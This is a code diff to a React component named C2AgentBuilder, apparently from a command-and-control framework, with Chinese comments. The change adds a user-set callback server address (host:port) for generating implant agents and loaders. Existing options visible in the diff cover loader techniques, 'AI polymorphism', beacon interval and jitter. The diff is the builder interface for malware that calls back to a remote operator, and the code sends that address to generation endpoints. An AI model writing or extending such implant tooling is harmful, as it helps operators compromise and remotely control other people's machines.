@@ -147,6 +147,8 @@ export function C2AgentBuilder() {
   const [aiPoly, setAiPoly] = React.useState(false);
   const [interval_, setInterval_] = React.useState(5);
   const [jitter, setJitter] = React.useState(20);
+  // 回连地址覆盖：云部署/反代/跨网段场景手动指定（空=自动取当前访问地址+监听端口）
+  const [srvOverride, setSrvOverride] = React.useState(() => localStorage.getItem("forang_c2_server") || "");
   const [result, setResult] = React.useState<{ url: string; filename: string; size: number; sha256: string; server: string; downloadUrl?: string } | null>(null);
   const [busy, setBusy] = React.useState(false);
   const [err, setErr] = React.useState("");
@@ -170,7 +172,9 @@ export function C2AgentBuilder() {
     if (!listenerId) { setErr("请先选择监听器"); return; }
     setBusy(true); setErr(""); setResult(null);
     try {
-      const { blob, filename, server, downloadUrl } = await api.c2Generate({ listener_id: listenerId, format });
+      const srv = srvOverride.trim();
+      localStorage.setItem("forang_c2_server", srv);
+      const { blob, filename, server, downloadUrl } = await api.c2Generate({ listener_id: listenerId, format, ...(srv ? { server: srv } : {}) });
       const buf = await blob.arrayBuffer();
       // WebCrypto 仅安全上下文（HTTPS/localhost）可用——HTTP 部署下降级跳过哈希
       let sha256 = "";
@@ -189,7 +193,9 @@ export function C2AgentBuilder() {
     if (!listenerId) { setErr("请先选择监听器"); return; }
     setBusy(true); setErr(""); setResult(null);
     try {
-      const { blob, filename, downloadUrl } = await api.c2LoaderGenerate({ listener_id: listenerId, technique, ai_poly: aiPoly && technique !== "t0_drop" });
+      const srv = srvOverride.trim();
+      localStorage.setItem("forang_c2_server", srv);
+      const { blob, filename, downloadUrl } = await api.c2LoaderGenerate({ listener_id: listenerId, technique, ai_poly: aiPoly && technique !== "t0_drop", ...(srv ? { server: srv } : {}) });
       const url = URL.createObjectURL(blob);
       setResult({ url, filename, size: blob.size, sha256: "", server: "", downloadUrl });
     } catch (e) {
@@ -249,6 +255,12 @@ export function C2AgentBuilder() {
           <select className="w-full rounded border bg-zinc-900 p-2 text-sm text-zinc-100 [color-scheme:dark]" value={format} onChange={(e) => setFormat(e.target.value)}>
             {AGENT_FORMATS.map((f) => (<option key={f.value} value={f.value}>{f.label}</option>))}
           </select>
+        </div>
+        <div>
+          <label className="mb-1 block text-xs text-muted-foreground">回连地址覆盖（可选，host:port——云部署/反代/跨网段时填写；留空=自动用当前访问地址+监听端口）</label>
+          <input type="text" className="w-full rounded border bg-transparent p-2 font-mono text-sm" value={srvOverride}
+                 onChange={(e) => setSrvOverride(e.target.value)}
+                 placeholder="例如 1.2.3.4:18248（须在云安全组放行该端口）" />
         </div>
         <div>
           <label className="mb-1 block text-xs text-muted-foreground">回连间隔（秒，部署后 sleep 指令可调）</label>
